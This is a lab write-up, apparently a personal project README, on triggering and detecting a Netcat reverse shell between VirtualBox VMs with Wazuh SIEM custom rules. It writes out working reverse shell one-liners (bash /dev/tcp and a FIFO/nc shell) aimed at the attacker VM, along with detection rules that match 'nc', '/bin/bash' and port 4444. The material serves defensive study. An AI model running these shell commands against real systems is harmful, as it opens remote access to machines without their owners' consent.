# Netcat Reverse Shell Detection using Wazuh SIEM

## **Date:** 7th & 8th May, 2026

---

## Environment

| Role | OS | IP |
|------|----|----|
| Attacker | Kali Linux VM | 10.219.27.131 |
| Victim | Ubuntu (VirtualBox) | 10.219.27.208 |
| Wazuh Server | Kali Main OS (Docker) | 10.219.27.37 |

---

## What I Did

I set up a simple lab with two VMs — a Kali attacker and an Ubuntu victim — and tried to detect a Netcat reverse shell using Wazuh SIEM. The Wazuh server was already running as a Docker container on my main Kali OS.

---

## Step 1 — Verified IPs

First I confirmed the IPs on all three machines using `ip a`.

**Victim (Ubuntu):**
```bash
ip a
```
![Victim IP](Images/VictimIp.png)

**Attacker (Kali VM):**
```bash
ip a
```
![Attacker IP](Images/AttackerIP.png)

**Wazuh Server (Kali Main OS):**
```bash
ip a
```
![Wazuh Server IP](Images/Wazuh_ServerIP.png)

---

## Step 2 — Checked Netcat on Both Machines

I verified Netcat was installed on both machines before starting.

**On Attacker:**
```bash
which nc
```
![Attacker Netcat](Images/attacker_netcat_check.png)

**On Victim:**
```bash
which nc
```
![Victim Netcat](Images/victim_netcat_check.png)

Both returned `/usr/bin/nc` so I was good to go.

---

## Step 3 — Started Netcat Listener on Attacker

On the Kali attacker VM, I started a listener on port 4444 waiting for the victim to connect back.

```bash
nc -lvnp 4444
```
![Netcat Listener Started](Images/netcat_listener_started.png)

The terminal showed `listening on [any] 4444 ...` — listener was up and waiting.

---

## Step 4 — Executed Reverse Shell from Victim

On the Ubuntu victim machine, I ran the bash reverse shell payload pointing back to the attacker.

```bash
bash -i >& /dev/tcp/10.219.27.131/4444 0>&1
```
![Victim Reverse Shell Command](Images/victim_reverse_shell_command.png)

I also tested a FIFO-based reverse shell:
```bash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc 10.219.27.131 4444 > /tmp/f
```
![Reverse Shell Final Attack](Images/reverse_shell_final_attack.png)

---

## Step 5 — Got Interactive Shell on Attacker

The listener received the connection from `10.219.27.208`. I ran a few commands to confirm I was inside the victim's shell.

```bash
whoami
hostname
pwd
```
![Interactive Reverse Shell Access](Images/interactive_reverse_shell_access.png)

Output confirmed — I was inside the victim machine remotely from the attacker.

---

## Step 6 — Configured Wazuh Agent on Victim

I edited the Wazuh agent config on the victim to add command monitoring for active network connections.

```bash
sudo nano /var/ossec/etc/ossec.conf
```

Added this block:
```xml
<localfile>
  <log_format>full_command</log_format>
  <command>ss -antp</command>
  <frequency>30</frequency>
</localfile>
```
![Wazuh Agent Config](Images/wazuh_agent_reverse_shell_config.png)

Then restarted and verified the agent:
```bash
sudo systemctl restart wazuh-agent
sudo systemctl status wazuh-agent
```
![Wazuh Agent Running](Images/wazuh_agent_running_reverse_shell.png)

Agent came back up with status `active (running)`.

---

## Step 7 — Added Custom Detection Rules

I got into the Wazuh manager container and added three custom rules to `local_rules.xml`.

```bash
docker exec -it single-node-wazuh.manager-1 bash
```

```bash
sed -i '$d' /var/ossec/etc/rules/local_rules.xml

cat >> /var/ossec/etc/rules/local_rules.xml << 'EOF'
<rule id="100700" level="12">
  <match>nc</match>
  <description>Possible Netcat Execution Detected</description>
  <group>reverse_shell,netcat,execution,</group>
</rule>

<rule id="100701" level="13">
  <match>/bin/bash</match>
  <description>Possible Reverse Shell Activity Detected</description>
  <group>reverse_shell,bash,shell_execution,</group>
</rule>

<rule id="100702" level="10">
  <match>4444</match>
  <description>Suspicious Reverse Shell Port Connection</description>
  <group>reverse_shell,network_connection,</group>
</rule>

</group>
EOF
```

Verified the rules got added:
```bash
tail -20 /var/ossec/etc/rules/local_rules.xml
```

Then restarted the Wazuh manager:
```bash
/var/ossec/bin/wazuh-control restart
```
![Rules Added Successfully](Images/reverse_shell_rules_added_successfully.png)

---

## Step 8 — Detected the Alert in Wazuh

After restarting, I re-ran the reverse shell and searched in the Wazuh **Threat Hunting** module.

```
rule.id: 100700
```

![Alert Detected](Images/reverse_shell_custom_alert_detected.png)

Rule 100700 fired — **"Possible Netcat Execution Detected"** — at severity level 12, twice, for agent `kishansai-VirtualBox`.

![Alert Log](Images/reverse_shell_custom_alert_detected_log.png)

Expanded the log to see the full details — `agent.ip: 10.219.27.208`, `rule.level: 12`, `rule.groups: reverse_shell, netcat, execution`.

![Alert Document](Images/reverse_shell_alert_document.png)

The document view confirmed everything — alert timestamped `May 11, 2026 @ 14:20:21`, `rule.firedtimes: 2`, `rule.mail: true`.

---

## What I have Observed

- Rule 100700 triggered consistently. Rules 100701 and 100702 didn't fire — the reverse shell was short-lived and the 30-second `ss -antp` poll likely missed the active connection.
- Wazuh picked up the Netcat activity through syslog entries that matched the `nc` pattern.
- Custom rules worked as expected once the manager restarted.
- Threat Hunting made it straightforward to search and verify by rule ID.
